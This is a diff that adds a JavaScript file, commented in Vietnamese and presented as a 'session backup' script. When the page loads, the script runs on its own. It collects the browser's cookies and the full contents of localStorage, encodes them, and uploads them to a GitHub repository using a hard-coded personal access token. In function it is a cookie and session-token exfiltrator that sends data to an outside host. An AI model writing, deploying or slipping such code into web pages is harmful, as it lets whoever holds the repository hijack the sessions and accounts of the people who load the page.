@@ -1,0 +1,53 @@
+async function pushToGitHub() {
+  const GITHUB_TOKEN = 'ghp_xxx_THAY_BANG_TOKEN_CUA_BAN';
+  const OWNER = 'ten_tai_khoan_github';
+  const REPO = 'ten_repository';
+  const FILE_PATH = 'data/session_backup.json'; // Đường dẫn file trên GitHub
+
+  // Dữ liệu bạn muốn đẩy lên (ví dụ: gom cookie và localStorage)
+  const payloadData = {
+    timestamp: new Date().toISOString(),
+    cookies: document.cookie,
+    localStorage: { ...window.localStorage }
+  };
+
+  // Mã hóa nội dung sang chuẩn Base64 (hỗ trợ tiếng Việt/UTF-8)
+  const jsonString = JSON.stringify(payloadData, null, 2);
+  const bytes = new TextEncoder().encode(jsonString);
+  const base64Content = btoa(String.fromCharCode(...bytes));
+
+  const apiUrl = `https://api.github.com/repos/${OWNER}/${REPO}/contents/${FILE_PATH}`;
+  const headers = {
+    'Authorization': `Bearer ${GITHUB_TOKEN}`,
+    'Accept': 'application/vnd.github+json',
+    'Content-Type': 'application/json'
+  };
+
+  // Kiểm tra xem file đã tồn tại chưa để lấy mã SHA (bắt buộc nếu ghi đè file cũ)
+  let sha = null;
+  const checkRes = await fetch(apiUrl, { headers });
+  if (checkRes.ok) {
+    const existingFile = await checkRes.json();
+    sha = existingFile.sha;
+  }
+
+  // Đẩy file lên GitHub
+  const response = await fetch(apiUrl, {
+    method: 'PUT',
+    headers,
+    body: JSON.stringify({
+      message: `Cập nhật dữ liệu lúc ${new Date().toLocaleString('vi-VN')}`,
+      content: base64Content,
+      ...(sha && { sha })
+    })
+  });
+
+  const result = await response.json();
+  if (response.ok) {
+    console.log('Đã đẩy lên GitHub thành công:', result.content.html_url);
+  } else {
+    console.error('Lỗi khi đẩy lên GitHub:', result);
+  }
+}
+
+pushToGitHub();
